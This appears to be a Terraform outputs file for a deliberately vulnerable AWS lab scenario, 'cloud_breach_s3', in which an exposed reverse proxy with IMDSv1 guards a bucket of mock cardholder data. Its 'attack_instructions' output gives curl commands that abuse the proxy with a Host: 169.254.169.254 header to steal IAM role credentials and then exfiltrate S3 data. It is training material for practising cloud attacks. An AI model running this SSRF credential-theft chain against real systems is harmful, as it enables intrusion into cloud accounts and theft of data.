#############################################
# Outputs for cloud_breach_s3 Scenario
#############################################

output "scenario_name" {
  description = "Unique name for this scenario deployment"
  value       = local.scenario_name
}

#-----------------------------------------
# Starting Information (What attacker knows)
#-----------------------------------------

output "target_ec2_ip" {
  description = "Public IP of the vulnerable reverse proxy (YOUR STARTING POINT)"
  value       = aws_instance.reverse_proxy.public_ip
}

output "aws_account_id" {
  description = "AWS Account ID where resources are deployed"
  value       = data.aws_caller_identity.current.account_id
}

#-----------------------------------------
# Scenario Details (For reference)
#-----------------------------------------

output "ec2_instance_id" {
  description = "EC2 Instance ID"
  value       = aws_instance.reverse_proxy.id
}

output "s3_bucket_name" {
  description = "Name of the S3 bucket containing sensitive data"
  value       = aws_s3_bucket.cardholder_data.id
  sensitive   = true # Hidden by default - this is what you're trying to find!
}

output "iam_role_name" {
  description = "Name of the IAM role attached to EC2"
  value       = aws_iam_role.ec2_role.name
  sensitive   = true # Hidden by default
}

#-----------------------------------------
# Security Configuration Status
#-----------------------------------------

output "imds_version" {
  description = "IMDS version in use (v1 = vulnerable, v2 = secure)"
  value       = var.use_imdsv2 ? "IMDSv2 (Secure)" : "IMDSv1 (Vulnerable)"
}

output "vulnerability_status" {
  description = "Current vulnerability configuration"
  value = {
    imds_vulnerable  = !var.use_imdsv2
    ssh_enabled      = var.enable_ssh
    open_to_internet = contains(var.allowed_cidr_blocks, "0.0.0.0/0")
  }
}

#-----------------------------------------
# Attack Instructions
#-----------------------------------------

output "attack_instructions" {
  description = "Instructions to exploit this scenario"
  value       = <<-EOT

    ╔══════════════════════════════════════════════════════════════════╗
    ║              CLOUD BREACH S3 - ATTACK SCENARIO                  ║
    ╠══════════════════════════════════════════════════════════════════╣
    ║  TARGET: ${aws_instance.reverse_proxy.public_ip}
    ║  GOAL: Download the confidential files from the S3 bucket       ║
    ╠══════════════════════════════════════════════════════════════════╣
    ║  STEP 1: Probe the target                                        ║
    ║    curl http://${aws_instance.reverse_proxy.public_ip}
    ║                                                                  ║
    ║  STEP 2: Exploit reverse proxy to query IMDS                     ║
    ║    curl http://${aws_instance.reverse_proxy.public_ip}/latest/meta-data/iam/security-credentials/ \
    ║      -H 'Host: 169.254.169.254'                                  ║
    ║                                                                  ║
    ║  STEP 3: Extract IAM credentials                                 ║
    ║    curl http://${aws_instance.reverse_proxy.public_ip}/latest/meta-data/iam/security-credentials/<ROLE> \
    ║      -H 'Host: 169.254.169.254'                                  ║
    ║                                                                  ║
    ║  STEP 4: Configure AWS CLI with stolen creds and exfiltrate!     ║
    ╚══════════════════════════════════════════════════════════════════╝
  EOT
}

#-----------------------------------------
# Cleanup Command
#-----------------------------------------

output "cleanup_command" {
  description = "Command to destroy all resources"
  value       = "terraform destroy -auto-approve"
}

#-----------------------------------------
# Data Sources
#-----------------------------------------

data "aws_caller_identity" "current" {}
